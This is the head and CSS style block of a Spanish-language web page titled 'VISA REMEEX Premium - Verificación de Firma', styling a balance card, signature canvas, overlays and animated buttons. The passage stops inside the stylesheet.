<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>VISA REMEEX Premium - Verificación de Firma</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
  <meta name="description" content="Verificación de Firma, Proceso de Seguridad Adicional. VISA REMEEX Premium.">

  <link rel="icon" href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" type="image/png">

  <!-- Fuentes e Iconos -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">

  <style>
    :root {
      /* ============ Variables globales para ambos estilos ============ */
      --primary: #1a1f71; /* Azul oscuro de Visa */
      --primary-light: #2c348e;
      --primary-dark: #0d153e; /* Azul más oscuro */
      --secondary: #3b82f6;
      --accent: #60a5fa;
      --success: #22c55e;
      --success-dark: #16a34a;
      --danger: #ef4444;
      --danger-dark: #dc2626;
      --warning: #f59e0b;
      --warning-dark: #d97706;

      --border-white: #ffffff;
      --border-gray: #d1d5db;
      --border-light-blue: #93c5fd;

      --background: #f8fafc;
      --card-bg: rgba(255, 255, 255, 0.98);
      --text-primary: #0f172a;
      --text-secondary: #475569;
      --text-light: #94a3b8;

      --border-radius-xl: 28px;
      --border-radius-lg: 24px;
      --border-radius: 16px;
      --border-radius-sm: 12px;

      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      --transition-bounce: all 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
      --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05);
      --shadow: 0 10px 20px rgba(0, 0, 0, 0.3), 0 6px 6px rgba(0, 0, 0, 0.2);
      --shadow-lg: 0 25px 50px rgba(0, 0, 0, 0.3);

      --aurora-gradient: linear-gradient(
        120deg,
        rgba(26, 31, 113, 0.4),
        rgba(25, 35, 102, 0.3),
        rgba(30, 40, 120, 0.3),
        rgba(26, 31, 113, 0.2)
      );
      background-size: 400% 400%;

      /* ============ Variables específicas de la tarjeta de saldo (nueva) ============ */
      --primary-2: #1a1f71; /* Azul oscuro de Visa (repetido) */
      --primary-dark-2: #0d153e;
      --accent-2: #00e676; /* Verde más vibrante para acentos */
      --accent-glow: rgba(0, 230, 118, 0.7);
      --card-bg-2: linear-gradient(150deg, #1a237e 0%, #0d47a1 100%);
      --text-white: rgba(255, 255, 255, 0.95);
      --text-light: rgba(255, 255, 255, 0.8);
      --portal-glow: rgba(0, 230, 118, 0.4);

      /* Nuevas variables para overlays */
      --neon-green: #39ff14;
      --neon-green-light: #5fff3f;
      --neon-green-dark: #32e410;
      --neon-green-glow: rgba(57, 255, 20, 0.5);
      --neon-green-glow-bright: rgba(57, 255, 20, 0.75);
      
      --glow-blue: rgba(59, 130, 246, 0.4);
      --glow-blue-bright: rgba(59, 130, 246, 0.7);
      --glow-green: rgba(34, 197, 94, 0.4);
      --glow-red: rgba(239, 68, 68, 0.4);
      
      --border-radius-2: 24px;
      --transition-2: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      --shadow-2: 0 20px 40px rgba(0, 0, 0, 0.25);
      --shadow-inner: inset 0 2px 4px 0 rgb(0 0 0 / 0.05);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
      font-family: 'Inter', sans-serif;
      color: var(--text-primary);
      line-height: 1.6;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 1rem;
      overflow-x: hidden;
    }

    /* Contenedor principal */
    .container {
      max-width: 650px;
      width: 100%;
      margin-top: 2rem;
      background: var(--card-bg);
      border-radius: var(--border-radius-xl);
      box-shadow: var(--shadow);
      backdrop-filter: blur(10px);
      border: 2px solid var(--border-white);
      overflow: hidden;
      position: relative;
      opacity: 0;
      transform: scale(0.95);
      transition: opacity 0.3s ease-out, transform 0.3s ease-out;
      animation: glow 6s ease infinite, border-blink 6s linear infinite;
    }
    .container.active {
      opacity: 1;
      transform: scale(1);
    }

    @keyframes glow {
      0%, 100% {
        box-shadow: 0 0 40px rgba(26, 31, 113, 0.5), 0 0 80px rgba(26, 31, 113, 0.3);
      }
      50% {
        box-shadow: 0 0 70px rgba(26, 31, 113, 0.8), 0 0 100px rgba(26, 31, 113, 0.6);
      }
    }
    @keyframes border-blink {
      0%   { border-color: var(--border-white); }
      33%  { border-color: var(--border-gray); }
      66%  { border-color: var(--border-light-blue); }
      100% { border-color: var(--border-white); }
    }

    /* Encabezado principal */
    .header {
      text-align: center;
      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
      color: #fff;
      padding: 3rem 2rem;
      position: relative;
      overflow: hidden;
      border-top-left-radius: var(--border-radius-xl);
      border-top-right-radius: var(--border-radius-xl);
      background-image: var(--aurora-gradient);
      animation: aurora-animation 15s ease infinite;
    }
    @keyframes aurora-animation {
      0%   { background-position: 0% 50%; }
      50%  { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .header::after {
      content: "";
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(120deg, transparent, rgba(255,255,255,0.6), transparent);
      transform: skewX(-20deg);
      opacity: 0;
      z-index: 1;
      animation: header-flash 3s infinite;
    }
    @keyframes header-flash {
      0% {
        left: -100%;
        opacity: 0;
      }
      10% {
        left: -50%;
        opacity: 1;
      }
      50% {
        left: 100%;
        opacity: 1;
      }
      60% {
        left: 100%;
        opacity: 0;
      }
      100% {
        left: 100%;
        opacity: 0;
      }
    }
    .header-logo {
      display: block;
      margin: 0 auto;
      width: 80%;
      max-width: 400px;
      height: auto;
      position: relative;
      z-index: 2;
    }

    /* ============ Tarjeta de SALDO (nueva) ============ */
    .new-balance-card-container {
      margin: -2rem 1.5rem 1.5rem 1.5rem;
      position: relative;
      z-index: 2;
    }
    .card {
      background: var(--card-bg-2);
      color: var(--text-white);
      border-radius: var(--border-radius-2);
      padding: 1.5rem;
      box-shadow: var(--shadow-2);
      position: relative;
      overflow: hidden;
      min-height: 180px;
      transition: var(--transition-2);
      border: 1px solid rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(5px);
    }
    .card:hover {
      transform: translateY(-5px) scale(1.02);
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
    }

    /* Contenedor de partículas (nueva tarjeta) */
    .particles-container {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      z-index: 1;
    }
    .particle {
      position: absolute;
      width: 6px;
      height: 6px;
      background: radial-gradient(circle, rgba(0, 230, 118, 1) 0%, rgba(0, 230, 118, 0.2) 70%);
      border-radius: 50%;
      opacity: 0;
      pointer-events: none;
      filter: drop-shadow(0 0 3px rgba(0, 230, 118, 0.8));
    }
    .particle.diamond {
      clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
      background: var(--accent-2);
    }
    .particle.mini {
      width: 3px;
      height: 3px;
      background: var(--accent-2);
    }
    .particle.trail::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: inherit;
      filter: blur(2px);
      opacity: 0.7;
      transform: translateX(-5px);
    }

    /* Portal de transferencia */
    .transfer-portal {
      position: absolute;
      right: -15px;
      top: 50%;
      transform: translateY(-50%);
      width: 30px;
      height: 85%;
      background: var(--portal-glow);
      box-shadow: inset 0 0 20px var(--accent-2);
      border-radius: 50px 0 0 50px;
      z-index: 2;
      overflow: hidden;
      animation: portalPulse 3s infinite;
    }
    .transfer-portal::before {
      content: "";
      position: absolute;
      top: 10%;
      bottom: 10%;
      left: 0;
      width: 100%;
      background: repeating-linear-gradient(
        to bottom,
        transparent,
        transparent 5px,
        rgba(0, 230, 118, 0.3) 5px,
        rgba(0, 230, 118, 0.3) 10px
      );
      opacity: 0.6;
      animation: portalLines 8s linear infinite;
    }
    @keyframes portalLines {
      0% { transform: translateY(0); }
      100% { transform: translateY(100px); }
    }
    @keyframes portalPulse {
      0%, 100% { opacity: 0.8; box-shadow: inset 0 0 20px var(--accent-2), 0 0 15px rgba(0, 230, 118, 0.3); }
      50% { opacity: 1; box-shadow: inset 0 0 35px var(--accent-2), 0 0 30px var(--accent-glow); }
    }

    /* Efecto glow suave (nueva tarjeta) */
    .card::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: radial-gradient(
        circle at 70% 50%,
        rgba(59, 130, 246, 0.3) 0%,
        rgba(0, 230, 118, 0.08) 30%,
        transparent 70%
      );
      z-index: 0;
      animation: glowPulse 10s infinite;
    }
    @keyframes glowPulse {
      0%, 100% { opacity: 0.8; }
      50% { opacity: 0.6; }
    }
    /* Efecto de cuadrícula suave */
    .card::after {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image:
        linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
      background-size: 20px 20px;
      z-index: 0;
      opacity: 0.3;
    }

    /* Cabecera de la tarjeta */
    .card-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 0.75rem;
      position: relative;
      z-index: 5;
    }
    .logo {
      font-weight: 700;
      letter-spacing: -0.5px;
      font-size: 1.2rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    .logo i {
      color: var(--accent-2);
    }
    .exchange-rate {
      font-size: 0.8rem;
      opacity: 0.8;
      display: flex;
      align-items: center;
      gap: 0.4rem;
    }

    /* Sección de saldo */
    .balance-section {
      position: relative;
      z-index: 5;
      margin-bottom: 0.5rem;
      padding-top: 0.5rem;
    }
    .balance-label {
      font-size: 0.85rem;
      color: var(--text-light);
      margin-bottom: 0.5rem;
    }
    .balance-amount {
      font-size: 2.2rem;
      font-weight: 700;
      margin-bottom: 0.5rem;
      display: flex;
      align-items: center;
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
      background: linear-gradient(to right, #ffffff, #e0e0e0);
      -webkit-background-clip: text;
      background-clip: text;
      -webkit-text-fill-color: transparent;
      position: relative;
      /* This ensures text stays visible without changing appearance */
      filter: drop-shadow(0 0 0.5px rgba(255, 255, 255, 0.01));
    }
    .balance-amount::after {
      content: '';
      position: absolute;
      bottom: -5px;
      left: 0;
      width: 100%;
      height: 1px;
      background: linear-gradient(to right, transparent, rgba(255, 255, 255, 0.5), transparent);
    }

    /* Sección info dinámica unificada */
    .info-section {
      position: relative;
      z-index: 5;
      height: 1.3rem;
      margin-top: 0.75rem;
    }
    .dynamic-text {
      font-size: 0.7rem;
      opacity: 0.85;
      transition: opacity 0.5s;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    /* Spinner moderno */
    .spinner {
      display: inline-block;
      width: 14px;
      height: 14px;
      position: relative;
      margin-left: 8px;
      vertical-align: middle;
    }
    .spinner-circle {
      box-sizing: border-box;
      position: absolute;
      width: 100%;
      height: 100%;
      border: 2px solid transparent;
      border-top-color: var(--accent-2);
      border-radius: 50%;
      animation: spinnerRotate 1.5s linear infinite;
    }
    .spinner-inner {
      display: block;
      position: absolute;
      left: 3px;
      top: 3px;
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background-color: var(--accent-2);
      opacity: 0.7;
      animation: spinnerPulse 1s ease-in-out infinite alternate;
    }
    @keyframes spinnerRotate {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    @keyframes spinnerPulse {
      0% { transform: scale(0.8); opacity: 0.3; }
      100% { transform: scale(1); opacity: 0.7; }
    }
    /* Estilos alternativos spinner */
    .spinner.style2 .spinner-circle {
      border-width: 1px;
      border-top-width: 3px;
      border-left-width: 3px;
    }
    .spinner.style2 .spinner-inner {
      background: linear-gradient(45deg, var(--accent-2), transparent);
      opacity: 0.9;
    }
    .spinner.style3 {
      overflow: visible;
    }
    .spinner.style3 .spinner-circle {
      border: none;
      background: conic-gradient(
        from 0deg,
        transparent 0%,
        var(--accent-2) 40%,
        var(--accent-2) 60%,
        transparent 85%
      );
    }
    .spinner.style3 .spinner-inner {
      width: 5px;
      height: 5px;
      left: 4.5px;
      top: 4.5px;
      box-shadow: 0 0 5px var(--accent-glow);
    }
    .spinner.style4 .spinner-circle {
      border-top-color: var(--accent-2);
      border-right-color: var(--accent-2);
      opacity: 0.7;
    }
    .spinner.style4 .spinner-inner {
      animation: spinnerPulse 0.5s ease-in-out infinite alternate;
    }

    /* Dot loader (puntos suspensivos) */
    .dot-loader {
      display: inline-block;
      font-size: 0.7rem;
    }
    .dot-loader::after {
      content: "";
      animation: dotAnimation 1.5s steps(1, end) infinite;
      display: inline-block;
      width: 1.5em;
      text-align: left;
    }
    @keyframes dotAnimation {
      0% { content: ""; }
      33% { content: "."; }
      66% { content: ".."; }
      100% { content: "..."; }
    }

    /* ============ Estilos de las secciones, formularios, overlays ============ */
    .progress-bar {
      height: 16px;
      background-color: #e2e8f0;
      border-radius: var(--border-radius);
      margin: 2rem;
      overflow: hidden;
      position: relative;
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
    }
    .progress-bar-fill {
      height: 100%;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      width: 100%;
      transition: width 0.6s ease-in-out;
      border-radius: var(--border-radius);
      position: relative;
      overflow: hidden;
    }
    .progress-bar-fill::after {
      content: '';
      position: absolute;
      top: 0;
      left: -50%;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.3);
      transform: skewX(-45deg);
      animation: move 2s linear infinite;
    }
    @keyframes move {
      0% { left: -50%; }
      100% { left: 100%; }
    }
    .progress-text {
      position: absolute;
      width: 100%;
      top: 50%;
      transform: translateY(-50%);
      text-align: center;
      font-weight: bold;
      color: #fff;
      z-index: 3;
    }

    .section-content {
      padding: 2rem;
      opacity: 0;
      transform: translateY(10px);
      transition: all 0.4s ease-out;
      display: none;
    }
    .section-content.active {
      display: block;
      opacity: 1;
      transform: translateY(0);
    }
    .section-content h2 {
      margin-bottom: 1.5rem;
      font-size: 1.5rem;
      display: flex;
      align-items: center;
      gap: 0.75rem;
      color: var(--primary);
    }
    .section-content h2 i {
      color: var(--primary);
      font-size: 1.3rem;
    }
    .form-group {
      margin-bottom: 1.75rem;
    }
    .form-label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 500;
      color: var(--text-secondary);
      font-size: 0.95rem;
    }
    .form-control {
      width: 100%;
      padding: 0.875rem 1.25rem;
      border: 2px solid #e2e8f0;
      border-radius: var(--border-radius);
      font-size: 1rem;
      background: #fff;
      transition: var(--transition);
      color: var(--text-primary);
    }
    .form-control:hover {
      border-color: #cbd5e1;
    }
    .form-control:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.2);
    }

    .btn-container {
      display: flex;
      justify-content: flex-end;
      margin-top: 1.5rem;
      position: relative;
      width: 100%;
    }
    .btn-container2 {
      display: flex;
      justify-content: space-between;
      margin-top: 1.5rem;
      gap: 1rem;
      position: relative;
      flex-wrap: wrap;
    }
    .btn-disabled {
      opacity: 0.6;
      cursor: not-allowed;
      pointer-events: none;
    }

    /* Botón con glow */
    .btn-std-container {
      position: relative;
      width: auto;
      min-width: 120px;
      height: 50px;
      margin: 0.5rem 0;
    }
    .btn-glow-effect {
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
      background-size: 200% 100%;
      border-radius: 30px;
      animation: border-glow 3s ease infinite;
      filter: blur(15px);
      opacity: 0.7;
      z-index: 0;
    }
    @keyframes border-glow {
      0%   { background-position: -100% 0; }
      50%  { background-position: 100% 0; }
      100% { background-position: -100% 0; }
    }
    .btn-glow {
      position: relative;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: white;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      overflow: hidden;
      box-shadow: 0 15px 25px rgba(0,0,0,0.3), inset 0 -4px 8px rgba(255,255,255,0.3);
      transition: all 0.3s ease, transform 0.2s ease-in-out;
      z-index: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 600;
      font-size: 1rem;
    }
    .btn-glow:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
    }
    .btn-glow-content {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
    }
    .btn-glow-initial {
      opacity: 1;
      transform: translateX(0);
    }
    .btn-glow:hover .btn-glow-initial {
      opacity: 0;
      transform: translateX(100%);
    }
    .btn-glow-hover {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0;
      transform: translateX(-100%);
      color: white;
    }
    .btn-glow:hover .btn-glow-hover {
      opacity: 1;
      transform: translateX(0);
    }
    .btn-glow-icon {
      margin-left: 10px;
    }

    .btn-success {
      background: linear-gradient(135deg, var(--success), #109648);
    }
    .btn-danger {
      background: linear-gradient(135deg, var(--danger), #c81e1e);
    }

    .btn-support {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      padding: 0.75rem 1.5rem;
      background: white;
      color: var(--primary);
      border: 2px solid var(--primary);
      border-radius: var(--border-radius-sm);
      font-weight: 600;
      font-size: 0.95rem;
      text-decoration: none;
      transition: var(--transition);
      box-shadow: var(--shadow-sm);
    }
    .btn-support:hover {
      background: rgba(26, 31, 113, 0.05);
      transform: translateY(-2px);
      box-shadow: var(--shadow);
    }
    .btn-support i {
      margin-right: 8px;
    }

    /* Canvas de firma */
    .signature-canvas {
      border: 2px dashed var(--primary);
      border-radius: var(--border-radius-sm);
      width: 100%;
      height: 220px;
      background: #fff;
      margin-bottom: 1rem;
      position: relative;
      cursor: crosshair;
    }

    .verification-section {
      padding: 1.5rem;
      margin-bottom: 1.5rem;
      border-radius: var(--border-radius);
      border: 1px solid var(--border-gray);
      background-color: #f9fafb;
    }
    .verification-section p {
      text-align: justify;
      color: var(--text-secondary);
    }

    .info-section-old {
      background-color: #f9fafb;
      border-radius: var(--border-radius);
      padding: 1.5rem;
      margin-bottom: 1.5rem;
      border: 1px solid var(--border-gray);
    }
    .info-section-old p {
      text-align: justify;
      margin-bottom: 0.8rem;
      color: var(--text-primary);
    }
    .info-section-old ul,
    .info-section-old ol {
      padding-left: 1.5rem;
      margin-bottom: 1rem;
    }
    .info-section-old li {
      margin-bottom: 0.5rem;
      text-align: justify;
    }

    .highlight-card {
      background-color: #f0f9ff;
      border-radius: var(--border-radius);
      padding: 1.25rem;
      margin: 1rem 0;
      border: 1px solid rgba(59, 130, 246, 0.2);
    }
    .highlight-card p {
      margin: 0;
      line-height: 1.5;
    }

    .section-subtitle {
      margin-top: 1.5rem;
      margin-bottom: 1rem;
      font-size: 1.2rem;
      color: var(--primary);
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .icon-list {
      margin: 1rem 0;
      padding-left: 0;
      list-style: none;
    }
    .icon-list li {
      margin-bottom: 0.8rem;
      display: flex;
      align-items: flex-start;
      gap: 0.5rem;
      font-size: 0.95rem;
      color: var(--text-secondary);
      text-align: justify;
    }
    .icon-list li i {
      color: var(--primary);
      font-size: 1.1rem;
      margin-top: 2px;
      flex-shrink: 0;
    }

    .blur-container {
      position: relative;
      cursor: pointer;
      display: block;
      margin: 1.5rem 0;
    }
    .blur-container .security-data-card {
      filter: blur(8px);
      transition: filter 0.3s;
    }
    .blur-container .blur-overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: var(--text-primary);
      font-size: 1.1rem;
      font-weight: bold;
      background: rgba(255, 255, 255, 0.5);
      border-radius: var(--border-radius-sm);
      transition: opacity 0.3s;
      pointer-events: none;
      z-index: 1;
    }

    .security-data-card {
      background: #fff;
      border: 1px solid var(--primary);
      border-radius: var(--border-radius);
      padding: 1.5rem;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    .security-data-card p {
      margin: 0.5rem 0;
      font-size: 1rem;
      color: var(--text-primary);
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .security-data-card .copy-icon {
      color: var(--primary);
      cursor: pointer;
      padding: 4px;
      border-radius: 4px;
      transition: var(--transition);
    }
    .security-data-card .copy-icon:hover {
      background-color: rgba(26, 31, 113, 0.1);
    }

    /* ===== OVERLAYS ELEGANTES ===== */
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(15, 23, 42, 0.6);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
      padding: 1rem;
      opacity: 0;
      transition: opacity 0.4s ease;
    }

    .overlay.active {
      display: flex;
      opacity: 1;
      backdrop-filter: blur(6px);
      animation: fadeIn 0.4s forwards;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .modal {
      background: rgba(255, 255, 255, 0.95);
      border-radius: var(--border-radius-lg);
      padding: 2rem;
      width: 90%;
      max-width: 420px;
      box-shadow: var(--shadow-lg);
      text-align: center;
      position: relative;
      backdrop-filter: blur(8px);
      border: 2px solid transparent;
      transform: translateY(30px);
      opacity: 0;
      animation: slideUpFade 0.5s forwards 0.1s;
    }

    @keyframes slideUpFade {
      from {
        transform: translateY(30px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }

    .modal-glow {
      position: relative;
      background: white;
      border: 1px solid rgba(255, 255, 255, 0.2);
    }

    .modal-glow::before {
      content: '';
      position: absolute;
      inset: -1px;
      padding: 1px;
      border-radius: var(--border-radius-lg);
      background: linear-gradient(
        45deg, 
        var(--primary), 
        var(--secondary), 
        var(--primary),
        var(--secondary)
      );
      -webkit-mask: 
        linear-gradient(#fff 0 0) content-box, 
        linear-gradient(#fff 0 0);
      -webkit-mask-composite: xor;
      mask-composite: exclude;
      z-index: -1;
      animation: border-flow 6s linear infinite;
      background-size: 300% 300%;
    }

    @keyframes border-flow {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .modal-glow::after {
      content: '';
      position: absolute;
      inset: -6px;
      z-index: -2;
      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
                  var(--glow-blue-bright) 0%, 
                  var(--glow-blue) 30%, 
                  transparent 70%);
      border-radius: var(--border-radius-lg);
      opacity: 0.7;
      filter: blur(18px);
      animation: pulse-glow 4s ease-in-out infinite;
    }

    .modal-glow.warning::after {
      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
                  rgba(245, 158, 11, 0.9) 0%, 
                  rgba(245, 158, 11, 0.6) 30%, 
                  transparent 70%);
    }

    .modal-glow.error::after {
      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
                  rgba(239, 68, 68, 0.9) 0%, 
                  rgba(239, 68, 68, 0.6) 30%, 
                  transparent 70%);
    }

    .modal-glow.success::after {
      background: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), 
                  rgba(34, 197, 94, 0.9) 0%, 
                  rgba(34, 197, 94, 0.6) 30%, 
                  transparent 70%);
    }

    @keyframes pulse-glow {
      0%, 100% {
        opacity: 0.6;
        filter: blur(14px);
      }
      50% {
        opacity: 0.9;
        filter: blur(18px);
      }
    }

    .modal h3 {
      font-size: 1.4rem;
      margin-bottom: 1rem;
      color: var(--primary);
      font-weight: 600;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      text-fill-color: transparent;
    }

    .modal p {
      font-size: 1rem;
      color: var(--text-secondary);
      margin-bottom: 1.5rem;
      line-height: 1.6;
      text-align: center;
    }

    /* Barra de progreso con verde fluorescente refinado */
    .overlay-progress-bar {
      position: relative;
      height: 12px;
      background-color: rgba(226, 232, 240, 0.8);
      border-radius: 30px;
      margin: 1.5rem 0;
      overflow: hidden;
      box-shadow: var(--shadow-inner);
    }

    .overlay-progress-fill {
      height: 100%;
      border-radius: 30px;
      background: linear-gradient(90deg, var(--neon-green-dark), var(--neon-green));
      transition: width 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
      position: relative;
      overflow: hidden;
      box-shadow: 0 0 8px var(--neon-green-glow), 
                  0 0 14px var(--neon-green-glow),
                  inset 0 0 12px var(--neon-green-glow-bright);
      width: 0%;
    }

    .overlay-progress-fill::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(
        90deg,
        transparent,
        rgba(255, 255, 255, 0.6),
        transparent
      );
      transform: translateX(-100%);
      animation: shimmer 2s infinite;
    }

    @keyframes shimmer {
      100% {
        transform: translateX(100%);
      }
    }

    .overlay-progress-fill.error {
      background: linear-gradient(90deg, var(--danger), var(--danger-dark));
      box-shadow: 0 0 8px var(--glow-red), 
                  0 0 14px var(--glow-red),
                  inset 0 0 12px rgba(239, 68, 68, 0.7);
    }

    .overlay-progress-fill.success {
      background: linear-gradient(90deg, var(--neon-green-dark), var(--neon-green));
      box-shadow: 0 0 8px var(--neon-green-glow), 
                  0 0 14px var(--neon-green-glow),
                  inset 0 0 12px var(--neon-green-glow-bright);
    }

    .overlay-progress-fill.warning {
      background: linear-gradient(90deg, var(--warning), var(--warning-dark));
      box-shadow: 0 0 8px rgba(245, 158, 11, 0.6), 
                  0 0 14px rgba(245, 158, 11, 0.6),
                  inset 0 0 12px rgba(245, 158, 11, 0.8);
    }
    
    .progress-percentage {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 0.7rem;
      font-weight: 600;
      color: var(--text-secondary);
      z-index: 5;
      text-shadow: 0 0 5px rgba(255, 255, 255, 0.7);
    }

    /* Spinner avanzado */
    .spinner-advanced {
      width: 60px;
      height: 60px;
      margin: 1.5rem auto;
      position: relative;
    }

    .spinner-ring {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 4px solid transparent;
      border-top-color: var(--primary);
      border-right-color: var(--secondary);
      animation: spinnerRotate 1.5s linear infinite;
      position: absolute;
      top: 0;
      left: 0;
    }

    .spinner-ring:nth-child(2) {
      width: 80%;
      height: 80%;
      top: 10%;
      left: 10%;
      border-top-color: var(--secondary);
      border-left-color: var(--primary);
      animation-duration: 2s;
      animation-direction: reverse;
    }

    .spinner-ring:nth-child(3) {
      width: 60%;
      height: 60%;
      top: 20%;
      left: 20%;
      border-bottom-color: var(--primary);
      border-left-color: var(--secondary);
      animation-duration: 2.5s;
    }

    .spinner-dot {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 15px;
      height: 15px;
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      border-radius: 50%;
      animation: pulse 1.5s cubic-bezier(0.455, 0.03, 0.515, 0.955) infinite alternate;
    }

    @keyframes pulse {
      0% {
        transform: translate(-50%, -50%) scale(0.6);
        opacity: 0.8;
      }
      100% {
        transform: translate(-50%, -50%) scale(1);
        opacity: 1;
      }
    }

    /* Estilo para la firma en miniatura */
    .signature-container {
      position: relative;
      width: 160px;
      height: 80px;
      margin: 1.5rem auto;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: var(--shadow);
      background: white;
    }

    .signature-img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      animation: pulse-soft 2s infinite alternate;
    }

    @keyframes pulse-soft {
      0% { opacity: 0.85; }
      100% { opacity: 1; }
    }

    /* Botones avanzados */
    .btn-advanced-container {
      position: relative;
      width: 140px;
      height: 48px;
      margin: 0.5rem;
    }

    .btn-advanced-effect {
      position: absolute;
      inset: -2px;
      border-radius: 30px;
      padding: 2px;
      background: linear-gradient(
        90deg, 
        var(--primary), 
        var(--secondary), 
        var(--primary)
      );
      background-size: 200% 100%;
      animation: gradient-shift 4s ease infinite;
      box-shadow: 0 0 0 3px rgba(26, 31, 113, 0.1);
      overflow: hidden;
    }

    @keyframes gradient-shift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .btn-advanced {
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, var(--primary), var(--primary-light));
      color: white;
      border: none;
      border-radius: 28px;
      cursor: pointer;
      overflow: hidden;
      position: relative;
      z-index: 1;
      font-weight: 600;
      font-size: 0.95rem;
      transition: var(--transition-bounce);
      display: flex;
      align-items: center;
      justify-content: center;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .btn-advanced:hover {
      transform: translateY(-3px) scale(1.02);
      box-shadow: 0 10px 15px rgba(26, 31, 113, 0.2);
    }

    .btn-advanced:active {
      transform: translateY(-1px) scale(0.98);
    }

    .btn-content {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
      backface-visibility: hidden;
    }

    .btn-text {
      display: flex;
      align-items: center;
      transition: var(--transition);
    }

    .btn-icon {
      margin-left: 8px;
      font-size: 1rem;
      opacity: 0;
      width: 0;
      transform: translateX(-10px);
      transition: var(--transition);
    }

    .btn-advanced:hover .btn-icon {
      opacity: 1;
      width: auto;
      transform: translateX(0);
    }

